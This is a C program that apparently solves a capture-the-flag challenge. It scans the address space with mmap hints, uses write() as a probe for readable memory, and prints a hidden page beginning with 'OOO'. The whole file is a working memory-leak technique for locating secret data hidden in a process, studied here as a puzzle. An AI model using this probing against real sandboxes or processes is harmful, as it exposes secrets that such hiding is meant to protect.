static int mio_errno = 0;
#define SYS_ERRNO mio_errno

#include "linux-syscall-support/linux_syscall_support.h"

#include <sys/mman.h>
/*
#include <err.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
*/


// TODO: keep in sync
#define ADDR_MIN   0x0000100000000000UL  // Low-ish
#define ADDR_MASK  0x00000ffffffff000UL  // Page-aligns


#define chunk_size  4 * 4096UL * 4096UL  /* Note: internal mincore buf is 4096*4096 */
#define nchunks     (ADDR_MIN+ADDR_MASK) / (chunk_size)

//#ifdef NDEBUG
#define DBG(...) (void)0
//#else
//#define DBG(...) fprintf(stderr, __VA_ARGS__)
//#endif


static int try_mmap(void *addr)
{
    mio_errno = 0;
    void* pg = sys_mmap((void*)addr, chunk_size,
            PROT_READ, // Original has read+write, we only want read...
            MAP_ANONYMOUS | MAP_PRIVATE,
            -1, 0);
    if (pg == MAP_FAILED)
    {
        if (mio_errno == EPERM) {
            DBG("Ignoring EPERM on 0x%16lx .. 0x%16lx\n", start, start+chunk_size-1);
            return 0;
        }
        DBG("UNEXPECTED MAP_FAILED (errno=%d): 0x%16lx .. 0x%16lx\n", mio_errno, start, start+chunk_size-1);
        return 0;
    }
    if (pg != addr)
        sys_munmap((void*) pg, chunk_size);
    return (pg != addr);
}


static int check_page(uintptr_t addr)
{
    const char *p = (const char *) addr;
    if (p[0] == 'O' && p[1] == 'O' && p[2] == 'O') // Header check
    {
        //DBG("\n\nFOUND IT! addr = %p, content = %s\n", p, p);
        //sys_write(1, "\n\nFOUND IT:\n", 12);
        sys_write(1, p, 200);
        return 1;
    }
    return 0;
}


static int check_chunk(uintptr_t start)
{
    if (start == 0) // 0-page prot
        return 0;

    if (try_mmap((void*) start))
    {
        DBG("Found a candidate: mmap(%lx) gave %lx instead. Scanning...\n", start, (uintptr_t)pg);
        for (uintptr_t addr = start; addr < (start+chunk_size); addr += 4096) {
            DBG("Checking page at %#lx...\r", addr);
            if (sys_write(1, (void*) addr, 1) == 1) {
                //DBG(" Could write(1) == can read mem from %p. Checking what's inside...\n", (void*) addr);
                if (check_page(addr))
                    return 1;
                else DBG("Nope, that was a red herring (%#lx)\n", addr);
            } //else warn("Could not write(1), prob. no mem at %p", addr);
        }
        sys_munmap((void*)start, chunk_size);
    }
    return 0;
}


void _start()
{
    DBG("---- SMALLER solution  ----\n");
    DBG("Searching %zu chunks, each %lu MB (%lu MB = %lu GB total)\n",
        nchunks, chunk_size/1024/1024,
        chunk_size/1024/1024*nchunks,
        chunk_size/1024/1024*nchunks/1024);
    uintptr_t start = ADDR_MIN;
    for (size_t i = 1; i <= nchunks; i++) {
        DBG("Scanning chunk %3zu/%3zu [0x%16lx .. 0x%16lx)\r", i, nchunks, start, start+chunk_size);
        if (check_chunk(start))
            ;//sys_exit_group(0);
        start += chunk_size;
    }
    sys_exit_group(2);
}
